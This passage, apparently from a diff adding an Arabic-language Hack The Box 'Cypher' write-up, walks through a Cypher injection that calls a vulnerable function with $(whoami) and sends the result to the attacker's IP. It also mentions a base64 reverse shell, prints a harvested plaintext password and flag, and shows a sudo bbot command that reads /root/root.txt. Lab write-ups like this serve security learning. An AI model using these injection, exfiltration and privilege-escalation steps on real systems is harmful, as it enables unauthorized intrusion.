+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>الجزء الأول <code>(nice' RETURN h.value AS hash)</code> بيحاول يعمل Cypher Injection عن طريق كسر الquery الأصلية، و UNION بيضمن تنفيذ الجزء التاني، اللي بيستدعي الدالة المصابة بالثغرة <code>(custom.getUrlStatusCode)</code> مع URL معمول بحيث يكون فيه أمر <code>$(whoami)</code>، وده بينفذ أمر على السيرفر وبيبعت اسم المستخدم في الURL لـ 10.10.16.59.</p>
+<p>وصللنا رد باسم المستخدم <code>neo4j</code> من الأمر whoami:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">10.10.11.57 - - [01/Mar/2025 15:39:38] &quot;GET /neo4j HTTP/1.1&quot; 404 -
+</span></code></pre>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-cypher&#x2F;assets/images/CypherWhoamiPayload.png" 
+      alt="cypher whoami" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>جربنا نحقن Reverse Shell بشكل base64 عشان نجيب الـ <code>user.txt</code>:</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-cypher&#x2F;assets/images/ReverseShell.png" 
+      alt="reverse shell" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>للأسف، مقدرناش نقرا الـ <code>user.txt</code> بالمستخدم <code>neo4j</code>، لكن لحسن الحظ لقينا كلمة السر للمستخدم <code>graphasm</code> في ملف اسمه <code>bbot_preset.yml</code>.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">neo4j@cypher:/home/graphasm$</span><span style="color:#abb2bf;"> cat bbot_preset.yml 
+</span><span style="color:#eb6772;">targets:
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">-</span><span style="color:#abb2bf;"> ecorp.htb
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">output_dir:</span><span style="color:#abb2bf;"> /home/graphasm/bbot_scans
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">config:
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">modules:
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">neo4j:
+</span><span style="color:#abb2bf;">      </span><span style="color:#eb6772;">username:</span><span style="color:#abb2bf;"> neo4j
+</span><span style="color:#abb2bf;">      </span><span style="color:#eb6772;">password:</span><span style="color:#abb2bf;"> cU4btyib.20xtCMCXkBmerhK
+</span><span style="color:#eb6772;">neo4j@cypher:/home/graphasm$</span><span style="color:#abb2bf;"> su graphasm
+</span><span style="color:#eb6772;">Password: 
+</span><span style="color:#eb6772;">graphasm@cypher:~$</span><span style="color:#abb2bf;"> ls
+</span><span style="color:#eb6772;">bbot_preset.yml</span><span style="color:#abb2bf;">  user.txt
+</span><span style="color:#eb6772;">graphasm@cypher:~$</span><span style="color:#abb2bf;"> cat user.txt 
+</span><span style="color:#eb6772;">877410eb42c621eb6c4fbf3197244182
+</span><span style="color:#eb6772;">graphasm@cypher:~$
+</span></code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>اول حاجة ببدأ بيها بعد ما اوصل لل <code>user flag (user.txt)</code> اني اشوف ايه الي اقدر اعمله بصلاحية الroot عن طريق الأمر <code>sudo -l</code>:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">graphasm@cypher:~$</span><span style="color:#abb2bf;"> sudo</span><span style="color:#eb6772;"> -l
+</span><span style="color:#eb6772;">Matching</span><span style="color:#abb2bf;"> Defaults entries for graphasm on cypher:
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">env_reset,</span><span style="color:#abb2bf;"> mail_badpass, secure_path=/usr/local/sbin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/usr/local/bin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/usr/sbin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/usr/bin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/sbin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/bin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/snap/bin, use_pty
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">User</span><span style="color:#abb2bf;"> graphasm may run the following commands on cypher:
+</span><span style="color:#abb2bf;">    (</span><span style="color:#eb6772;">ALL</span><span style="color:#abb2bf;">) NOPASSWD: /usr/local/bin/bbot
+</span><span style="color:#eb6772;">graphasm@cypher:~$
+</span></code></pre>
+<blockquote>
+<p><strong>BBOT (Basic Bug-hunting &amp; OSINT Tool)</strong> أداة مفتوحة المصدر لفحص الثغرات وجمع المعلومات (OSINT).
+بتساعد في أتمتة عمليات زي جمع النطاقات الفرعية (subdomains)، فحص المنافذ (Ports)، والزحف على الويب (Web Crawling)، وبتستخدم مصادر بيانات متعددة.
+🔗 <a href="https://github.com/blacklanternsecurity/bbot">GitHub: blacklanternsecurity/bbot</a></p>
+</blockquote>
+<p>لازم نلاقي طريقة نقرا بيها الـ <code>root.txt</code> flag من خلال <code>bbot</code>، فلاقينا طريقة نقدر نحقق بيها ده وده الأمر النهائي: <code>graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run</code>.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">sudo</span><span style="color:#abb2bf;"> /usr/local/bin/bbot</span><span style="color:#eb6772;"> -cy</span><span style="color:#abb2bf;"> /root/root.txt</span><span style="color:#eb6772;"> -d --dry-run
+</span></code></pre>
+<p><strong>شرح الأمر:</strong>
+<strong><code>sudo</code></strong> → بيشغل BBOT بصلاحيات <strong>root</strong>.<br />
+<strong><code>/usr/local/bin/bbot</code></strong> → المسار الكامل لأداة <strong>BBOT</strong>.<br />
+<strong><code>-cy /root/root.txt</code></strong><br />
+<code>-c</code> → بيحدد ملف إعدادات مخصص (Configuration file).<br />
+<code>-y</code> →  بينفذ الأمر علي طول من غير تأكيد مني.<br />
+<code>/root/root.txt</code> → ملف فيه الـ flag اللي عايزين نقراه.
+<strong><code>-d</code></strong> → بيشغل وضع <strong>debug</strong> عشان نشوف التفاصيل.<br />
+<strong><code>--dry-run</code></strong> → بيشغل محاكاة من غير تغييرات فعلية، مفيد للاختبار كأنه بيورينا هو هيعمل ايه من غير ما ينفذه.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">graphasm@cypher:~$</span><span style="color:#abb2bf;"> sudo /usr/local/bin/bbot</span><span style="color:#eb6772;"> -cy</span><span style="color:#abb2bf;"> /root/root.txt</span><span style="color:#eb6772;"> -d --dry-run
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">______</span><span style="color:#abb2bf;">  _____   ____ _______
+</span><span style="color:#abb2bf;"> </span><span style="color:#adb7c9;">|  </span><span style="color:#eb6772;">___ </span><span style="color:#5ebfcc;">\|</span><span style="color:#abb2bf;">  __ </span><span style="color:#5ebfcc;">\ </span><span style="color:#abb2bf;">/ __ </span><span style="color:#5ebfcc;">\_</span><span style="color:#abb2bf;">_   __</span><span style="color:#adb7c9;">|
+</span><span style="color:#abb2bf;"> </span><span style="color:#adb7c9;">| |</span><span style="color:#eb6772;">___</span><span style="color:#abb2bf;">) </span><span style="color:#adb7c9;">| |</span><span style="color:#eb6772;">__</span><span style="color:#abb2bf;">) </span><span style="color:#adb7c9;">| |  | | | |
+</span><span style="color:#abb2bf;"> </span><span style="color:#adb7c9;">|  </span><span style="color:#eb6772;">___ </span><span style="color:#adb7c9;">&lt;|  </span><span style="color:#eb6772;">__ </span><span style="color:#adb7c9;">&lt;| |  | | | |
+</span><span style="color:#abb2bf;"> </span><span style="color:#adb7c9;">| |</span><span style="color:#eb6772;">___</span><span style="color:#abb2bf;">) </span><span style="color:#adb7c9;">| |</span><span style="color:#eb6772;">__</span><span style="color:#abb2bf;">) </span><span style="color:#adb7c9;">| |</span><span style="color:#eb6772;">__</span><span style="color:#adb7c9;">| | | |
+</span><span style="color:#abb2bf;"> </span><span style="color:#adb7c9;">|</span><span style="color:#eb6772;">______/</span><span style="color:#adb7c9;">|</span><span style="color:#eb6772;">_____/ </span><span style="color:#5ebfcc;">\_</span><span style="color:#abb2bf;">___/  </span><span style="color:#adb7c9;">|</span><span style="color:#eb6772;">_</span><span style="color:#adb7c9;">|
+</span><span style="color:#abb2bf;"> </span><span style="color:#eb6772;">BIGHUGE</span><span style="color:#abb2bf;"> BLS OSINT TOOL v2.1.0.4939rc
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">www.blacklanternsecurity.com/bbot
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;stdout&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;output&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;csv&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;output&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;txt&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;output&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;python&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;output&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;json&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;output&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;aggregate&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;internal&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;dnsresolve&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;internal&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;cloudcheck&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;internal&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;excavate&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;internal&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Preset bbot_cli_main: Adding module </span><span style="color:#9acc76;">&quot;speculate&quot;</span><span style="color:#abb2bf;"> of type </span><span style="color:#9acc76;">&quot;internal&quot;
+</span><span style="color:#eb6772;">[VERB] 
+</span><span style="color:#eb6772;">[VERB] </span><span style="font-style:italic;color:#5f697a;">### MODULES ENABLED ###
+</span><span style="color:#eb6772;">[VERB] 
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Module     </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Type     </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Needs</span><span style="color:#abb2bf;"> API Key   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Description                   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Flags         </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Consumed</span><span style="color:#abb2bf;"> Events      </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Produced</span><span style="color:#abb2bf;"> Events    </span><span style="color:#adb7c9;">|
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +============+==========+=================+===============================+===============+======================+====================+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">csv        </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">output   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Output</span><span style="color:#abb2bf;"> to CSV                 </span><span style="color:#adb7c9;">|               | </span><span style="color:#eb6772;">*                    </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">json       </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">output   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Output</span><span style="color:#abb2bf;"> to Newline-Delimited   </span><span style="color:#adb7c9;">|               | </span><span style="color:#eb6772;">*                    </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 | </span><span style="color:#eb6772;">JSON</span><span style="color:#abb2bf;"> (NDJSON)                 </span><span style="color:#adb7c9;">|               |                      |                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">python     </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">output   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Output</span><span style="color:#abb2bf;"> via Python API         </span><span style="color:#adb7c9;">|               | </span><span style="color:#eb6772;">*                    </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">stdout     </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">output   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Output</span><span style="color:#abb2bf;"> to text                </span><span style="color:#adb7c9;">|               | </span><span style="color:#eb6772;">*                    </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">txt        </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">output   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Output</span><span style="color:#abb2bf;"> to text                </span><span style="color:#adb7c9;">|               | </span><span style="color:#eb6772;">*                    </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">cloudcheck </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">internal </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Tag</span><span style="color:#abb2bf;"> events by cloud provider, </span><span style="color:#adb7c9;">|               | </span><span style="color:#eb6772;">*                    </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 | </span><span style="color:#eb6772;">identify</span><span style="color:#abb2bf;"> cloud resources like </span><span style="color:#adb7c9;">|               |                      |                    |
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 | </span><span style="color:#eb6772;">storage</span><span style="color:#abb2bf;"> buckets               </span><span style="color:#adb7c9;">|               |                      |                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">dnsresolve </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">internal </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">|                               |               | </span><span style="color:#eb6772;">*                    </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">aggregate  </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">internal </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Summarize</span><span style="color:#abb2bf;"> statistics at the   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">passive,</span><span style="color:#abb2bf;"> safe </span><span style="color:#adb7c9;">|                      |                    |
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 | </span><span style="color:#eb6772;">end</span><span style="color:#abb2bf;"> of a scan                 </span><span style="color:#adb7c9;">|               |                      |                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">excavate   </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">internal </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Passively</span><span style="color:#abb2bf;"> extract juicy       </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">passive       </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">HTTP_RESPONSE,       </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">URL_UNVERIFIED,    </span><span style="color:#adb7c9;">|
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 | </span><span style="color:#eb6772;">tidbits</span><span style="color:#abb2bf;"> from scan data        </span><span style="color:#adb7c9;">|               | </span><span style="color:#eb6772;">RAW_TEXT             </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">WEB_PARAMETER      </span><span style="color:#adb7c9;">|
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">speculate  </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">internal </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">No              </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Derive</span><span style="color:#abb2bf;"> certain event types    </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">passive       </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">AZURE_TENANT,        </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">DNS_NAME,</span><span style="color:#abb2bf;"> FINDING, </span><span style="color:#adb7c9;">|
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 | </span><span style="color:#eb6772;">from</span><span style="color:#abb2bf;"> others by common sense   </span><span style="color:#adb7c9;">|               | </span><span style="color:#eb6772;">DNS_NAME,            </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">IP_ADDRESS,        </span><span style="color:#adb7c9;">|
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 |                               |               | </span><span style="color:#eb6772;">DNS_NAME_UNRESOLVED, </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">OPEN_TCP_PORT,     </span><span style="color:#adb7c9;">|
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 |                               |               | </span><span style="color:#eb6772;">HTTP_RESPONSE,       </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">ORG_STUB           </span><span style="color:#adb7c9;">|
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 |                               |               | </span><span style="color:#eb6772;">IP_ADDRESS,          </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 |                               |               | </span><span style="color:#eb6772;">IP_RANGE,</span><span style="color:#abb2bf;"> SOCIAL,    </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 |                               |               | </span><span style="color:#eb6772;">STORAGE_BUCKET,</span><span style="color:#abb2bf;"> URL, </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 |                               |               | </span><span style="color:#eb6772;">URL_UNVERIFIED,      </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB] </span><span style="color:#adb7c9;">|            |          |                 |                               |               | </span><span style="color:#eb6772;">USERNAME             </span><span style="color:#adb7c9;">|                    |
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+</span><span style="color:#eb6772;">[VERB]</span><span style="color:#abb2bf;"> Loading word cloud from /root/.bbot/scans/overmedicated_cheryl/wordcloud.tsv
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Failed to load word cloud from /root/.bbot/scans/overmedicated_cheryl/wordcloud.tsv: </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">Errno 2</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;"> No such file or directory: </span><span style="color:#9acc76;">&#39;/root/.bbot/scans/overmedicated_cheryl/wordcloud.tsv&#39;
+</span><span style="color:#eb6772;">[INFO]</span><span style="color:#abb2bf;"> Scan with 0 modules seeded with 0 targets (0 in whitelist)
+</span><span style="color:#eb6772;">[WARN]</span><span style="color:#abb2bf;"> No scan modules to load
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing stdout - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;stdout&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing csv - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;csv&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing aggregate - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;aggregate&quot;
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> Installing cloudcheck - Preloaded Deps {</span><span style="color:#9acc76;">&#39;modules&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;pip_constraints&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;shell&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;apt&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;ansible&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;common&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#cd74e8;">[]</span><span style="color:#abb2bf;">}
+</span><span style="color:#eb6772;">[DBUG]</span><span style="color:#abb2bf;"> No dependency work to do for module </span><span style="color:#9acc76;">&quot;cloudcheck&quot;
